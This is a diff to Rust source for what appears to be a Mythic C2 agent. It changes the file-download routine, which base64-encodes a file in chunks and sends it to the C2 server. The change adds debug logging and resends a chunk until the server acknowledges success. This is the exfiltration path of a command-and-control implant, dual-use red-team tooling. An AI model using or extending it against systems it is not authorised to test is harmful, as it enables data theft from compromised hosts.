@@ -69,6 +69,10 @@ async fn handle_send_file_to_mythic(msg: &mut SendFileToMythicStruct) {
 
     // Generate tracking UUID
     msg.tracking_uuid = uuid::Uuid::new_v4().to_string();
+    utils::print_debug(&format!(
+        "File transfer: task={} tracking={} chunks={} file={}",
+        msg.task_id, msg.tracking_uuid, total_chunks, msg.file_name
+    ));
 
     // Create channel for receiving responses from Mythic (routed via tracking_uuid)
     let (ft_tx, mut ft_rx) = mpsc::channel::<Value>(1);
@@ -77,6 +81,10 @@ async fn handle_send_file_to_mythic(msg: &mut SendFileToMythicStruct) {
     {
         let mut ft_map = msg.file_transfers.lock().unwrap();
         ft_map.insert(msg.tracking_uuid.clone(), ft_tx);
+        utils::print_debug(&format!(
+            "Registered tracking_uuid in file_transfers (map now has {} entries)",
+            ft_map.len()
+        ));
     }
 
     // Send initial registration (chunk_num 0 = metadata only, no data)
@@ -101,10 +109,15 @@ async fn handle_send_file_to_mythic(msg: &mut SendFileToMythicStruct) {
         let _ = msg.finished_transfer.send(0).await;
         return;
     }
+    utils::print_debug("Initial download registration sent, waiting for file_id from Mythic...");
 
     // Wait for Mythic to respond with file_id
     let file_id = match ft_rx.recv().await {
         Some(resp) => {
+            utils::print_debug(&format!(
+                "Received file transfer response: {:?}",
+                resp
+            ));
             if let Some(Value::String(fid)) = resp.get("file_id") {
                 fid.clone()
             } else {
@@ -121,23 +134,24 @@ async fn handle_send_file_to_mythic(msg: &mut SendFileToMythicStruct) {
             return;
         }
     };
+    utils::print_debug(&format!("Got file_id: {}, sending {} chunks", file_id, total_chunks));
 
     // Send each data chunk
-    for chunk_num in 1..=total_chunks {
+    let mut chunk_num = 1;
+    while chunk_num <= total_chunks {
         let start = (chunk_num - 1) * FILE_CHUNK_SIZE;
         let end = std::cmp::min(chunk_num * FILE_CHUNK_SIZE, data.len());
         let chunk_data = BASE64.encode(&data[start..end]);
 
-        let status = if msg.send_user_status_updates {
-            format!("Downloading {}/{} chunks...", chunk_num, total_chunks)
-        } else {
-            String::new()
-        };
+        utils::print_debug(&format!(
+            "Sending chunk {}/{} ({} bytes raw, {} bytes b64) file_id={}",
+            chunk_num, total_chunks, end - start, chunk_data.len(), file_id
+        ));
 
         let chunk_response = Response {
             task_id: msg.task_id.clone(),
             tracking_uuid: Some(msg.tracking_uuid.clone()),
-            status,
+            status: format!("Downloading {}/{} chunks...", chunk_num, total_chunks),
             download: Some(FileDownloadMessage {
                 total_chunks: total_chunks as i32,
                 chunk_num: chunk_num as i32,
@@ -156,15 +170,29 @@ async fn handle_send_file_to_mythic(msg: &mut SendFileToMythicStruct) {
         }
 
         // Wait for Mythic acknowledgment before sending next chunk
+        // Match Poseidon: only advance to next chunk on "success" status
         match ft_rx.recv().await {
             Some(resp) => {
+                utils::print_debug(&format!(
+                    "Chunk {}/{} ack: {:?}",
+                    chunk_num, total_chunks, resp
+                ));
                 if let Some(Value::String(s)) = resp.get("status") {
-                    if !s.contains("success") {
+                    if s.contains("success") {
+                        chunk_num += 1;
+                    } else {
                         utils::print_debug(&format!(
-                            "Chunk {}/{} ack status: {}",
+                            "Chunk {}/{} non-success status '{}', retrying",
                             chunk_num, total_chunks, s
                         ));
                     }
+                } else {
+                    // No status field - advance anyway (compat)
+                    utils::print_debug(&format!(
+                        "Chunk {}/{} ack had no status field, advancing",
+                        chunk_num, total_chunks
+                    ));
+                    chunk_num += 1;
                 }
             }
             None => {
@@ -178,6 +206,10 @@ async fn handle_send_file_to_mythic(msg: &mut SendFileToMythicStruct) {
     cleanup_file_transfer(&msg.file_transfers, &msg.tracking_uuid);
 
     // Signal transfer complete
+    utils::print_debug(&format!(
+        "File transfer complete for task {} ({})",
+        msg.task_id, msg.file_name
+    ));
     let _ = msg.finished_transfer.send(1).await;
 }
 
